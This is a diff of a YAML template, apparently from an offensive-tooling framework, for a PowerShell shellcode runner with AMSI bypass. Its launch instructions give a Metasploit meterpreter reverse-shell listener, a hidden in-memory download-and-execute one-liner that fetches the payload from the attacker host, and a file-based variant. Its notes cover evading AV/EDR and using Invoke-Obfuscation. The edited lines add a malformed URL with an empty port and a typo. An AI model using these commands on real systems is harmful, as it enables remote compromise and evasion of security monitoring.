@@ -1,18 +1,18 @@
 meta:
-  name: "Simple Shellcode Runner (PowerShell)"
+  name: "Simple Shellcode Runner (PowerShell)*"
   category: "Shellcode Execution"
   description: |
     Simple shellcode runner in PowerShell with AMSI bypass and reflection-based API loading.
-    
+
     Features:
     - AMSI bypass to evade AV/EDR script scanning
     - Dynamic API resolution via reflection (no P/Invoke signatures)
     - Direct shellcode execution via VirtualAlloc + CreateThread
     - Fileless execution capability
-    
+
     This runner is useful when PowerShell is available but compiled executables
     are restricted. Uses reflection to avoid static API signatures.
-    
+
     WARNING: For authorized security testing only!
 
   effectiveness: medium
@@ -76,26 +76,39 @@ output:
   compile:
     enabled: false
   launch_instructions: |
-    PowerShell Simple Shellcode Runner - Launch Instructions
+    # Start Listener
 
-    Start Listener:
-    $ msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"
+    ```bash
+    msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"
+    ```
 
-    Transfer and Execute (In-Memory):
-    $ powershell -ep bypass -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://{{ lhost }}/{{ output_file }}')"
+    # Transfer and Execute (In-Memory)
 
-    Alternative (File-Based):
-    $ python3 -m http.server 80
-    $ powershell -ep bypass -c "IWR -Uri http://{{ lhost }}/{{ output_file }} -OutFile {{ output_file }}; .\{{ output_file }}"
+    ```powershell
+    powershell -ep bypass -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://{{ lhost }}:/{{ output_file }}')"
+    ```
 
-    Notes:
+    # Alternative (File-Based)
+
+    **Attacker:**
+    ```bash
+    python3 -m http.server 80
+    ```
+
+    **Target:**
+    ```powershell
+    powershell -ep bypass -c "IWR -Uri http://{{ lhost }}:/{{ output_file }} -OutFile {{ output_file }}; .\{{ output_file }}"
+    ```
+
+    ## Noteses
+
     - Includes AMSI bypass to evade script scanning
     - Uses reflection for dynamic API resolution (VirtualAlloc, CreateThread, WaitForSingleObject)
     - No static P/Invoke signatures (evades some AV)
-    - EXITFUNC=thread ensures clean exit without crashing process
+    - `EXITFUNC=thread` ensures clean exit without crashing process
     - Executes shellcode in separate thread within PowerShell process
     - PowerShell Script Block Logging will record execution (Event ID 4104)
-    - Reverse shell connects to {{ lhost }}:{{ lport }}
+    - Reverse shell connects to `{{ lhost }}:{{ lport }}`
     - Consider Invoke-Obfuscation for additional evasion
 
     Troubleshooting:
